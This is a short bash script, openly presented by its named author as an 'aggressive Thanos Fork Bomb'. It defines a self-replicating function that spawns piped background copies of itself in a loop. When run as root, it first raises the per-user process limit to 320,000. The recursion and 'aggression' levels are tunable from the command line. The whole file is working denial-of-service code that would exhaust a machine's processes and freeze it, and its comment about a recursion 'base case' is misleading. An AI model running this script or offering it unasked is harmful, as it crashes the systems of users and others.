#!/bin/bash

# About: This is the aggressive Thanos Fork Bomb - THE AVENGERS VERSION
# Developer: Brainhub24 (Jan Gebser)
# Github: www.Brainhub24.com

#    ________  ________   ________  _____    _   ______  _____ ____  ____  
#   /_  __/ / / / ____/  /_  __/ / / /   |  / | / / __ \/ ___// __ )/ __ \ 
#    / / / /_/ / __/      / / / /_/ / /| | /  |/ / / / /\__ \/ __  / / / / 
#   / / / __  / /___     / / / __  / ___ |/ /|  / /_/ /___/ / /_/ / /_/ /  
#  /_/ /_/ /_/_____/    /_/ /_/ /_/_/  |_/_/ |_/\____//____/_____/\____/  

# Check if the script is run with root or sudo privileges
if [ "$EUID" -eq 0 ]; then
    echo "Running with root privileges."
    # Set ulimit to 320000 for root user
    ulimit -u 320000
else
    echo "Not running with root privileges. Using default settings."
fi

thanos() {
    # Playing with multiple subshell sessions with aggression offsets
    for _ in $(seq 1 $AGGRESSION_LEVEL); do
        ( thanos | thanos& ) &
        sleep $AGGRESSION_LEVEL
    done

    # Increase the recursion level with aggression offset
    local recursion_level=$(( $1 - 1 + $AGGRESSION_LEVEL ))

    # Base case: when recursion level reaches 0, stop further recursion
    if [ $recursion_level -gt 0 ]; then
        thanos $recursion_level
    fi
}

# Default values
RECURSION_LEVEL=3
AGGRESSION_LEVEL=2

# Parse command line arguments
while getopts ":r:a:" opt; do
  case $opt in
    r)
      RECURSION_LEVEL=$OPTARG
      ;;
    a)
      AGGRESSION_LEVEL=$OPTARG
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      exit 1
      ;;
    :)
      echo "Option -$OPTARG requires an argument." >&2
      exit 1
      ;;
  esac
done

# Call the thanos function with the specified recursion and aggression levels
thanos $RECURSION_LEVEL
